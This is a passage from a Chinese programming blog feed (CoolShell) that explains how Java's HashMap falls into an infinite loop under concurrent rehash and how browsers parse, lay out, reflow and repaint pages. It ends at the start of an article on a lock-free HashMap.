<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Hash%E8%A1%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84" title="Hash表数据结构">Hash表数据结构</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#HashMap%E7%9A%84rehash%E6%BA%90%E4%BB%A3%E7%A0%81" title="HashMap的rehash源代码">HashMap的rehash源代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%AD%A3%E5%B8%B8%E7%9A%84ReHash%E7%9A%84%E8%BF%87%E7%A8%8B" title="正常的ReHash的过程">正常的ReHash的过程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%B9%B6%E5%8F%91%E4%B8%8B%E7%9A%84Rehash" title="并发下的Rehash">并发下的Rehash</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98%E7%9A%84%E7%97%87%E7%8A%B6"></span>问题的症状<span class="ez-toc-section-end"></span>
</h4>
<p>从前我们的Java代码因为一些原因使用了HashMap这个东西，但是当时的程序是单线程的，一切都没有问题。后来，我们的程序性能有问题，所以需要变成多线程的，于是，变成多线程后到了线上，发现程序经常占了100%的CPU，查看堆栈，你会发现程序都Hang在了HashMap.get()这个方法上了，重启程序后问题消失。但是过段时间又会来。而且，这个问题在测试环境里可能很难重现。</p>
<p>我们简单的看一下我们自己的代码，我们就知道HashMap被多个线程操作。而Java的文档说HashMap是非线程安全的，应该用ConcurrentHashMap。</p>
<p>但是在这里我们可以来研究一下原因。</p>
<p><span id="more-9606"></span></p>
<h4>
<span class="ez-toc-section" id="Hash%E8%A1%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"></span>Hash表数据结构<span class="ez-toc-section-end"></span>
</h4>
<p>我需要简单地说一下HashMap这个经典的数据结构。</p>
<p>HashMap通常会用一个指针数组（假设为table[]）来做分散所有的key，当一个key被加入时，会通过Hash算法通过key算出这个数组的下标i，然后就把这个&lt;key, value&gt;插到table[i]中，如果有两个不同的key被算在了同一个i，那么就叫冲突，又叫碰撞，这样会在table[i]上形成一个链表。</p>
<p>我们知道，如果table[]的尺寸很小，比如只有2个，如果要放进10个keys的话，那么碰撞非常频繁，于是一个O(1)的查找算法，就变成了链表遍历，性能变成了O(n)，这是Hash表的缺陷（可参看《<a title="Hash Collision DoS 问题" href="https://coolshell.cn/articles/6424.html" target="_blank" rel="bookmark">Hash Collision DoS 问题</a>》）。</p>
<p>所以，Hash表的尺寸和容量非常的重要。一般来说，Hash表这个容器当有数据要插入时，都会检查容量有没有超过设定的thredhold，如果超过，需要增大Hash表的尺寸，但是这样一来，整个Hash表里的无素都需要被重算一遍。这叫rehash，这个成本相当的大。</p>
<p>相信大家对这个基础知识已经很熟悉了。</p>
<h4>
<span class="ez-toc-section" id="HashMap%E7%9A%84rehash%E6%BA%90%E4%BB%A3%E7%A0%81"></span>HashMap的rehash源代码<span class="ez-toc-section-end"></span>
</h4>
<p>下面，我们来看一下Java的HashMap的源代码。</p>
<p>Put一个Key,Value对到Hash表中：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW" data-enlighter-highlight="19">public V put(K key, V value)
{
    ......
    //算Hash值
    int hash = hash(key.hashCode());
    int i = indexFor(hash, table.length);
    //如果该key已被插入，则替换掉旧的value （链接操作）
    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }
    modCount++;
    //该key不存在，需要增加一个结点
    addEntry(hash, key, value, i);
    return null;
}</pre>
<p>检查容量是否超标</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW" data-enlighter-highlight="7">void addEntry(int hash, K key, V value, int bucketIndex)
{
    Entry&lt;K,V&gt; e = table[bucketIndex];
    table[bucketIndex] = new Entry&lt;K,V&gt;(hash, key, value, e);
    //查看当前的size是否超过了我们设定的阈值threshold，如果超过，需要resize
    if (size++ &gt;= threshold)
        resize(2 * table.length);
} </pre>
<p>新建一个更大尺寸的hash表，然后把数据从老的Hash表中迁移到新的Hash表中。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW" data-enlighter-highlight="9">void resize(int newCapacity)
{
    Entry[] oldTable = table;
    int oldCapacity = oldTable.length;
    ......
    //创建一个新的Hash Table
    Entry[] newTable = new Entry[newCapacity];
    //将Old Hash Table上的数据迁移到New Hash Table上
    transfer(newTable);
    table = newTable;
    threshold = (int)(newCapacity * loadFactor);
}</pre>
<p>迁移的源代码，注意高亮处：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW" data-enlighter-highlight="12,14,15,16">void transfer(Entry[] newTable)
{
    Entry[] src = table;
    int newCapacity = newTable.length;
    //下面这段代码的意思是：
    //  从OldTable里摘一个元素出来，然后放到NewTable中
    for (int j = 0; j &lt; src.length; j++) {
        Entry&lt;K,V&gt; e = src[j];
        if (e != null) {
            src[j] = null;
            do {
                Entry&lt;K,V&gt; next = e.next;
                int i = indexFor(e.hash, newCapacity);
                e.next = newTable[i];
                newTable[i] = e;
                e = next;
            } while (e != null);
        }
    }
} </pre>
<p>好了，这个代码算是比较正常的。而且没有什么问题。</p>
<h4>
<span class="ez-toc-section" id="%E6%AD%A3%E5%B8%B8%E7%9A%84ReHash%E7%9A%84%E8%BF%87%E7%A8%8B"></span>正常的ReHash的过程<span class="ez-toc-section-end"></span>
</h4>
<p>画了个图做了个演示。</p>
<ul>
<li>我假设了我们的hash算法就是简单的用key mod 一下表的大小（也就是数组的长度）。</li>
</ul>
<ul>
<li>最上面的是old hash 表，其中的Hash表的size=2, 所以key = 3, 7, 5，在mod 2以后都冲突在table[1]这里了。</li>
</ul>
<ul>
<li>接下来的三个步骤是Hash表 resize成4，然后所有的&lt;key,value&gt; 重新rehash的过程</li>
</ul>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E5%B9%B6%E5%8F%91%E4%B8%8B%E7%9A%84Rehash"></span>并发下的Rehash<span class="ez-toc-section-end"></span>
</h4>
<p><strong>1）假设我们有两个线程。</strong>我用红色和浅蓝色标注了一下。</p>
<p>我们再回头看一下我们的 transfer代码中的这个细节：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW" data-enlighter-highlight="2">do {
    Entry&lt;K,V&gt; next = e.next; // &lt;--假设线程一执行到这里就被调度挂起了
    int i = indexFor(e.hash, newCapacity);
    e.next = newTable[i];
    newTable[i] = e;
    e = next;
} while (e != null);</pre>
<p>而我们的线程二执行完成了。于是我们有下面的这个样子。</p>
<p><img alt="image placeholder" ></p>
<p>注意，<strong>因为Thread1的 e 指向了key(3)，而next指向了key(7)，其在线程二rehash后，指向了线程二重组后的链表</strong>。我们可以看到链表的顺序被反转后。</p>
<p><strong>2）线程一被调度回来执行。</strong></p>
<ul>
<li><strong>先是执行 newTalbe[i] = e;</strong></li>
<li><strong>然后是e = next，导致了e指向了key(7)，</strong></li>
<li><strong>而下一次循环的next = e.next导致了next指向了key(3)</strong></li>
</ul>
<p><img alt="image placeholder" ></p>
<p><strong>3）一切安好。</strong></p>
<p>线程一接着工作。<strong>把key(7)摘下来，放到newTable[i]的第一个，然后把e和next往下移</strong>。</p>
<p><img alt="image placeholder" ></p>
<p><strong>4）环形链接出现。</strong></p>
<p><strong>e.next = newTable[i] 导致  key(3).next 指向了 key(7)</strong></p>
<p><strong>注意：此时的key(7).next 已经指向了key(3)， 环形链表就这样出现了。</strong></p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><strong>于是，当我们的线程一调用到，HashTable.get(11)时，悲剧就出现了——Infinite Loop。</strong></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>有人把这个问题报给了Sun，不过Sun不认为这个是一个问题。因为HashMap本来就不支持并发。要并发就用ConcurrentHashmap</p>
<p><a href="http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6423457" target="_blank">http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6423457</a></p>
<p>我在这里把这个事情记录下来，只是为了让大家了解并体会一下并发环境下的危险。</p>
<p>参考：<a href="https://mailinator.blogspot.com/2009/06/beautiful-race-condition.html" rel="nofollow">http://mailinator.blogspot.com/2009/06/beautiful-race-condition.html</a></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-05-10T08:12:12+08:00</pubDate>
<guid>https://coolshell.cn/articles/9606.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 浏览器的渲染原理简介 ]]></title>
<link>https://coolshell.cn/articles/9666.html</link>
<content><![CDATA[ 
<p>看到这个标题大家一定会想到这篇神文《<a href="http://taligarsiel.com/Projects/howbrowserswork1.htm" target="_blank">How Browsers Work</a>》，这篇文章把浏览器的很多细节讲得很细，而且也被<a href="http://ux.sohu.com/topics/50972d9ae7de3e752e0081ff" target="_blank">翻译成了中文</a>。为什么我还想写一篇呢？因为两个原因，</p>
<p style="padding-left: 30px;">1）这篇文章太长了，阅读成本太大，不能一口气读完。</p>
<p style="padding-left: 30px;">2）花了大力气读了这篇文章后可以了解很多，但似乎对工作没什么帮助。</p>
<p>所以，我准备写下这篇文章来解决上述两个问题。希望你能在上班途中，或是坐马桶时就能读完，并能从中学会一些能用在工作上的东西。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%A4%A7%E6%B5%81%E7%A8%8B" title="浏览器工作大流程">浏览器工作大流程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#DOM%E8%A7%A3%E6%9E%90" title="DOM解析">DOM解析</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#CSS%E8%A7%A3%E6%9E%90" title="CSS解析">CSS解析</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%B8%B2%E6%9F%93" title="渲染">渲染</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%87%8F%E5%B0%91reflowrepaint" title="减少reflow/repaint">减少reflow/repaint</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%92%8C%E5%87%A0%E7%AF%87%E6%96%87%E7%AB%A0" title="几个工具和几篇文章">几个工具和几篇文章</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%A4%A7%E6%B5%81%E7%A8%8B"></span>浏览器工作大流程<span class="ez-toc-section-end"></span>
</h4>
<p>废话少说，先来看个图：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">从上面这个图中，我们可以看到那么几个事：</p>
<p><span id="more-9666"></span></p>
<p style="text-align: left;">1）浏览器会解析三个东西：</p>
<ul>
<li>一个是HTML/SVG/XHTML，事实上，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM Tree。</li>
</ul>
<ul>
<li>CSS，解析CSS会产生CSS规则树。</li>
</ul>
<ul>
<li>Javascript，脚本，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS Rule Tree.</li>
</ul>
<p>2）解析完成后，浏览器引擎会通过DOM Tree 和 CSS Rule Tree 来构造 Rendering Tree。注意：</p>
<ul>
<li>Rendering Tree 渲染树并不等同于DOM树，因为一些像Header或display:none的东西就没必要放在渲染树中了。</li>
</ul>
<ul>
<li>CSS 的 Rule Tree主要是为了完成匹配并把CSS Rule附加上Rendering Tree上的每个Element。也就是DOM结点。也就是所谓的Frame。</li>
</ul>
<ul>
<li>然后，计算每个Frame（也就是每个Element）的位置，这又叫layout和reflow过程。</li>
</ul>
<p>3）最后通过调用操作系统Native GUI的API绘制。</p>
<h4>
<span class="ez-toc-section" id="DOM%E8%A7%A3%E6%9E%90"></span>DOM解析<span class="ez-toc-section-end"></span>
</h4>
<p>HTML的DOM Tree解析如下：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Web page parsing&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div&gt;
        &lt;h1&gt;Web page parsing&lt;/h1&gt;
        &lt;p&gt;This is an example Web page.&lt;/p&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<p>上面这段HTML会解析成这样：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>下面是另一个有SVG标签的情况。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="CSS%E8%A7%A3%E6%9E%90"></span>CSS解析<span class="ez-toc-section-end"></span>
</h4>
<p>CSS的解析大概是下面这个样子（下面主要说的是Gecko也就是Firefox的玩法），假设我们有下面的HTML文档：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;doc&gt;
&lt;title&gt;A few quotes&lt;/title&gt;
&lt;para&gt;
  Franklin said that &lt;quote&gt;"A penny saved is a penny earned."&lt;/quote&gt;
&lt;/para&gt;
&lt;para&gt;
  FDR said &lt;quote&gt;"We have nothing to fear but &lt;span&gt;fear itself.&lt;/span&gt;"&lt;/quote&gt;
&lt;/para&gt;
&lt;/doc&gt;
</pre>
<p>于是DOM Tree是这个样子：</p>
<p><img alt="image placeholder" ></p>
<p>然后我们的CSS文档是这样的：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">  /* rule 1 */ doc { display: block; text-indent: 1em; }
/* rule 2 */ title { display: block; font-size: 3em; }
/* rule 3 */ para { display: block; }
/* rule 4 */ [class="emph"] { font-style: italic; }</pre>
<p>于是我们的CSS Rule Tree会是这个样子：</p>
<p><img alt="image placeholder" ></p>
<p>注意，图中的第4条规则出现了两次，一次是独立的，一次是在规则3的子结点。所以，我们可以知道，建立CSS Rule Tree是需要比照着DOM Tree来的。CSS匹配DOM Tree主要是从右到左解析CSS的Selector，好多人以为这个事会比较快，其实并不一定。关键还看我们的CSS的Selector怎么写了。</p>
<p><strong>注意：CSS匹配HTML元素是一个相当复杂和有性能问题的事情。所以，你就会在N多地方看到很多人都告诉你，DOM树要小，CSS尽量用id和class，千万不要过渡层叠下去，……</strong></p>
<p>通过这两个树，我们可以得到一个叫Style Context Tree，也就是下面这样（把CSS Rule结点Attach到DOM Tree上）：</p>
<p><img alt="image placeholder" ></p>
<p>所以，Firefox基本上来说是通过CSS 解析 生成 CSS Rule Tree，然后，通过比对DOM生成Style Context Tree，然后Firefox通过把Style Context Tree和其Render Tree（Frame Tree）关联上，就完成了。注意：Render Tree会把一些不可见的结点去除掉。而<strong>Firefox中所谓的Frame就是一个DOM结点，不要被其名字所迷惑了</strong>。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>注：Webkit不像Firefox要用两个树来干这个，Webkit也有Style对象，它直接把这个Style对象存在了相应的DOM结点上了。</p>
<h4>
<span class="ez-toc-section" id="%E6%B8%B2%E6%9F%93"></span>渲染<span class="ez-toc-section-end"></span>
</h4>
<p>渲染的流程基本上如下（黄色的四个步骤）：</p>
<ol>
<li>计算CSS样式</li>
<li>构建Render Tree</li>
<li>Layout – 定位坐标和大小，是否换行，各种position, overflow, z-index属性 ……</li>
<li>正式开画</li>
</ol>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">注意：上图流程中有很多连接线，这表示了Javascript动态修改了DOM属性或是CSS属会导致重新Layout，有些改变不会，就是那些指到天上的箭头，比如，修改后的CSS rule没有被匹配到，等。</p>
<p style="text-align: left;">这里重要要说两个概念，一个是Reflow，另一个是Repaint。这两个不是一回事。</p>
<ul>
<li>Repaint——屏幕的一部分要重画，比如某个CSS的背景色变了。但是元素的几何尺寸没有变。</li>
</ul>
<ul>
<li>Reflow——意味着元件的几何尺寸变了，我们需要重新验证并计算Render Tree。是Render Tree的一部分或全部发生了变化。这就是Reflow，或是Layout。（<strong>HTML使用的是flow based layout，也就是流式布局，所以，如果某元件的几何尺寸发生了变化，需要重新布局，也就叫reflow</strong>）reflow 会从&lt;html&gt;这个root frame开始递归往下，依次计算所有的结点几何尺寸和位置，在reflow过程中，可能会增加一些frame，比如一个文本字符串必需被包装起来。</li>
</ul>
<p>下面是一个打开Wikipedia时的Layout/reflow的视频（注：HTML在初始化的时候也会做一次reflow，叫 <dfn>intial reflow</dfn>），你可以感受一下：</p>
<p></p>
<center><object width="480" height="400" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" align="middle"><param name="src" value="http://player.youku.com/player.php/sid/XMzI5MDg0OTA0/v.swf">
<param name="allowfullscreen" value="true">
<param name="quality" value="high">
<param name="allowscriptaccess" value="always">
<embed width="480" height="400" type="application/x-shockwave-flash" src="http://player.youku.com/player.php/sid/XMzI5MDg0OTA0/v.swf" allowfullscreen="true" quality="high" allowscriptaccess="always" align="middle"></embed></object></center>Reflow的成本比Repaint的成本高得多的多。DOM Tree里的每个结点都会有reflow方法，一个结点的reflow很有可能导致子结点，甚至父点以及同级结点的reflow。<strong>在一些高性能的电脑上也许还没什么，但是如果reflow发生在手机上，那么这个过程是非常痛苦和耗电的</strong>。
<p>所以，下面这些动作有很大可能会是成本比较高的。</p>
<ul>
<li>当你增加、删除、修改DOM结点时，会导致Reflow或Repaint</li>
<li>当你移动DOM的位置，或是搞个动画的时候。</li>
<li>当你修改CSS样式的时候。</li>
<li>当你Resize窗口的时候（移动端没有这个问题），或是滚动的时候。</li>
<li>当你修改网页的默认字体时。</li>
</ul>
<p style="text-align: left;">注：display:none会触发reflow，而visibility:hidden只会触发repaint，因为没有发现位置变化。</p>
<p style="text-align: left;">多说两句关于滚屏的事，通常来说，如果在滚屏的时候，我们的页面上的所有的像素都会跟着滚动，那么性能上没什么问题，因为我们的显卡对于这种把全屏像素往上往下移的算法是很快。但是如果你有一个fixed的背景图，或是有些Element不跟着滚动，有些Elment是动画，那么这个滚动的动作对于浏览器来说会是相当相当痛苦的一个过程。你可以看到很多这样的网页在滚动的时候性能有多差。因为滚屏也有可能会造成reflow。</p>
<p style="text-align: left;">基本上来说，reflow有如下的几个原因：</p>
<ul>
<li>Initial。网页初始化的时候。</li>
<li>Incremental。一些Javascript在操作DOM Tree时。</li>
<li>Resize。其些元件的尺寸变了。</li>
<li>StyleChange。如果CSS的属性发生变化了。</li>
<li>Dirty。几个Incremental的reflow发生在同一个frame的子树上。</li>
</ul>
<p style="text-align: left;">好了，我们来看一个示例吧：</p>
<p>[javascript]var bstyle = document.body.style; // cache</p>
<p>bstyle.padding = "20px"; // reflow, repaint<br>
bstyle.border = "10px solid red"; //  再一次的 reflow 和 repaint</p>
<p>bstyle.color = "blue"; // repaint<br>
bstyle.backgroundColor = "#fad"; // repaint</p>
<p>bstyle.fontSize = "2em"; // reflow, repaint</p>
<p>// new DOM element – reflow, repaint<br>
document.body.appendChild(document.createTextNode(‘dude!’));[/javascript]</p>
<p style="text-align: left;">当然，我们的浏览器是聪明的，它不会像上面那样，你每改一次样式，它就reflow或repaint一次。<strong>一般来说，浏览器会把这样的操作积攒一批，然后做一次reflow，这又叫异步reflow或增量异步reflow</strong>。但是有些情况浏览器是不会这么做的，比如：resize窗口，改变了页面默认的字体，等。对于这些操作，浏览器会马上进行reflow。</p>
<p style="text-align: left;">但是有些时候，我们的脚本会阻止浏览器这么干，比如：如果我们请求下面的一些DOM值：</p>
<ol>
<li>offsetTop, offsetLeft, offsetWidth, offsetHeight</li>
<li>scrollTop/Left/Width/Height</li>
<li>clientTop/Left/Width/Height</li>
<li>IE中的 getComputedStyle(), 或 currentStyle</li>
</ol>
<p style="text-align: left;">因为，如果我们的程序需要这些值，那么浏览器需要返回最新的值，而这样一样会flush出去一些样式的改变，从而造成频繁的reflow/repaint。</p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E5%87%8F%E5%B0%91reflowrepaint"></span>减少reflow/repaint<span class="ez-toc-section-end"></span>
</h4>
<p>下面是一些Best Practices：</p>
<p><strong>1）不要一条一条地修改DOM的样式。与其这样，还不如预先定义好css的class，然后修改DOM的className。</strong></p>
<p>[javascript]// bad<br>
var left = 10,<br>
top = 10;<br>
el.style.left = left + "px";<br>
el.style.top  = top  + "px";</p>
<p>// Good<br>
el.className += " theclassname";</p>
<p>// Good<br>
el.style.cssText += "; left: " + left + "px; top: " + top + "px;";[/javascript]</p>
<p><strong>2）把DOM离线后修改。如：</strong></p>
<ul>
<li>使用documentFragment 对象在内存里操作DOM</li>
<li>先把DOM给display:none(有一次reflow)，然后你想怎么改就怎么改。比如修改100次，然后再把他显示出来。</li>
<li>clone一个DOM结点到内存里，然后想怎么改就怎么改，改完后，和在线的那个的交换一下。</li>
</ul>
<p>3）<strong>不要把DOM结点的属性值放在一个循环里当成循环里的变量。</strong>不然这会导致大量地读写这个结点的属性。</p>
<p>4）<strong>尽可能的修改层级比较低的DOM</strong>。当然，改变层级比较底的DOM有可能会造成大面积的reflow，但是也可能影响范围很小。</p>
<p>5）<strong>为动画的HTML元件使用fixed或absoult的position</strong>，那么修改他们的CSS是不会reflow的。</p>
<p>6）<strong>千万不要使用table布局</strong>。因为可能很小的一个小改动会造成整个table的重新布局。</p>
<blockquote>
<p>In this manner, the user agent can begin to lay out the table once the entire first row has been received. Cells in subsequent rows do not affect column widths. Any cell that has content that overflows uses the ‘overflow’ property to determine whether to clip the overflow content.</p>
<p><cite><a href="https://www.w3.org/TR/CSS21/tables.html#fixed-table-layout">Fixed layout, CSS 2.1 Specification</a></cite></p>
</blockquote>
<blockquote>
<p>This algorithm may be inefficient since it requires the user agent to have access to all the content in the table before determining the final layout and may demand more than one pass.</p>
<p><cite><a href="https://www.w3.org/TR/CSS21/tables.html#auto-table-layout">Automatic layout, CSS 2.1 Specification</a></cite></p>
</blockquote>
<h4>
<span class="ez-toc-section" id="%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%92%8C%E5%87%A0%E7%AF%87%E6%96%87%E7%AB%A0"></span>几个工具和几篇文章<span class="ez-toc-section-end"></span>
</h4>
<p>有时候，你会也许会发现在IE下，你不知道你修改了什么东西，结果CPU一下子就上去了到100%，然后过了好几秒钟repaint/reflow才完成，这种事情以IE的年代时经常发生。所以，我们需要一些工具帮我们看看我们的代码里有没有什么不合适的东西。</p>
<ul>
<li>Chrome下，Google的<a href="https://code.google.com/webtoolkit/speedtracer/">SpeedTracer</a>是个非常强悍的工作让你看看你的浏览渲染的成本有多大。其实Safari和Chrome都可以使用开发者工具里的一个Timeline的东东。</li>
</ul>
<ul>
<li>Firefox下这个基于Firebug的叫<a href="https://addons.mozilla.org/en-US/firefox/addon/firebug-paint-events/" target="_blank">Firebug Paint Events</a>的插件也不错。</li>
</ul>
<ul>
<li>IE下你可以用一个叫<a href="https://ajax.dynatrace.com/pages/">dynaTrace</a>的IE扩展。</li>
</ul>
<p>最后，别忘了下面这几篇提高浏览器性能的文章：</p>
<ul>
<li><a href="https://code.google.com/speed/page-speed/docs/rules_intro.html">Google – Web Performance Best Practices</a></li>
<li><a href="https://developer.yahoo.com/performance/rules.html">Yahoo – Best Practices for Speeding Up Your Web Site</a></li>
<li><a href="http://stevesouders.com/hpws/rules.php">Steve Souders – 14 Rules for Faster-Loading Web Sites</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>David Baron的演讲：Fast CSS: How Browsers Lay Out Web Pages：<a href="https://dbaron.org/talks/2012-03-11-sxsw/slide-1.xhtml" target="_blank">slideshow</a>, <a href="https://dbaron.org/talks/2012-03-11-sxsw/master.xhtml">all slides</a>, <a href="http://audio.sxsw.com/2012/podcasts/11-ACC-Fast_CSS_How_Browser_Layout.mp3">audio (MP3)</a>, <a href="http://schedule.sxsw.com/2012/events/event_IAP12909">Session page</a>, <a href="http://lanyrd.com/2012/sxsw-interactive/spmbt/">Lanyrd page</a>
</li>
</ul>
<ul>
<li>How Browsers Work: <a href="http://taligarsiel.com/Projects/howbrowserswork1.htm" target="_blank">http://taligarsiel.com/Projects/howbrowserswork1.htm</a>
</li>
</ul>
<ul>
<li>Mozilla 的 Style System Overview：<a href="https://developer.mozilla.org/en-US/docs/Style_System_Overview" target="_blank">https://developer.mozilla.org/en-US/docs/Style_System_Overview</a>
</li>
</ul>
<ul>
<li>Mozilla 的 Note of reflow： <a href="https://www-archive.mozilla.org/newlayout/doc/reflow.html" target="_blank">http://www-archive.mozilla.org/newlayout/doc/reflow.html</a>
</li>
</ul>
<ul>
<li>Rendering: repaint, reflow/relayout, restyle：<a href="http://www.phpied.com/rendering-repaint-reflowrelayout-restyle/" target="_blank">http://www.phpied.com/rendering-repaint-reflowrelayout-restyle/</a>
</li>
</ul>
<ul>
<li>Effective Rendering CSS：<a href="https://css-tricks.com/efficiently-rendering-css/" target="_blank">http://css-tricks.com/efficiently-rendering-css/</a>
</li>
</ul>
<ul>
<li>
<strong></strong>Webkit Rendering文档：<a href="https://trac.webkit.org/wiki/WebCoreRendering" target="_blank">http://trac.webkit.org/wiki/WebCoreRendering</a>
</li>
</ul>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-05-22T08:17:47+08:00</pubDate>
<guid>https://coolshell.cn/articles/9666.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 无锁HashMap的原理与实现 ]]></title>
<link>https://coolshell.cn/articles/9703.html</link>
<content><![CDATA[ 
<p><strong> (本文由<a href="https://github.com/onetwogoo" rel="author">onetwogoo</a>投稿)</strong></p>
<p>在《<a title="疫苗：Java HashMap的死循环" href="https://coolshell.cn/articles/9606.html" target="_blank">疫苗：Java HashMap的死循环</a>》中，我们看到，java.util.HashMap并不能直接应用于多线程环境。对于多线程环境中应用HashMap，主要有以下几种选择：</p>
<ol>
<li><span style="line-height: 13px;">使用线程安全的java.util.Hashtable作为替代。</span></li>
<li>使用java.util.Collections.synchronizedMap方法，将已有的HashMap对象包装为线程安全的。</li>
<li>使用java.util.concurrent.ConcurrentHashMap类作为替代，它具有非常好的性能。</li>
</ol>
<p>而以上几种方法在实现的具体细节上，都或多或少地用到了互斥锁。互斥锁会造成线程阻塞，降低运行效率，并有可能产生死锁、优先级翻转等一系列问题。</p>
<p>CAS(Compare And Swap)是一种底层硬件提供的功能，它可以将判断并更改一个值的操作原子化。关于CAS的一些应用，《<a title="无锁队列的实现" href="https://coolshell.cn/articles/8239.html" target="_blank">无锁队列的实现</a>》一文中有很详细的介绍。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Java%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C" title="Java中的原子操作">Java中的原子操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%97%A0%E9%94%81%E9%93%BE%E8%A1%A8%E7%9A%84%E5%AE%9E%E7%8E%B0" title="无锁链表的实现">无锁链表的实现</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%97%A0%E9%94%81HashMap%E7%9A%84%E9%9A%BE%E7%82%B9%E4%B8%8E%E7%AA%81%E7%A0%B4" title="无锁HashMap的难点与突破">无锁HashMap的难点与突破</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-4" href="#%E5%AE%9E%E7%8E%B0%E7%BB%86%E8%8A%82" title="实现细节">实现细节</a><ul class="ez-toc-list-level-5">
